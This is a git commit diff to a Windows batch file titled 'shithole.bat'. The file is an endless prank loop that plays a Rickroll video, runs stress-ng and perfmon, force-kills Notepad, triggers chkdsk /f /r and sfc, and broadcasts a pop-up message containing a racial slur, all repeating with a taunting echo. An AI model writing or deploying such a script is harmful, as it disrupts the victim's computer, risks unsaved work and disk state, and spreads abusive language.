12f2b3bb652a26287cdcd8cc3652f26e7412c1c2
Ali Khalaf <ska.likhalaf@proton.me>
2025-12-12 14:52:59 +0300

    Update shithole.bat

--- windows/shithole.bat
+++ windows/shithole.bat
@@ -2,7 +2,20 @@
 :StartLoop
 start "" "Rickroll.mp4"
 powercfg -s SCHEME_MAX
-dir /s 
-winsat formal
+systeminfo
+tasklist
+taskkill /F /IM notepad.exe
+sfc /scannow
+chkdsk C: /f /r
+ipconfig /all
+ping 8.8.8.8
+tracert google.com
+netstat -ano
+perfmon
+stress-ng 
+perfmon /report
+systeminfo
+ping 1.1.1.1
+msg * "bich ass nigga hahahahahahahah"
 echo commands executed, repeating mwahahahahahaha bitch
 goto StartLoop
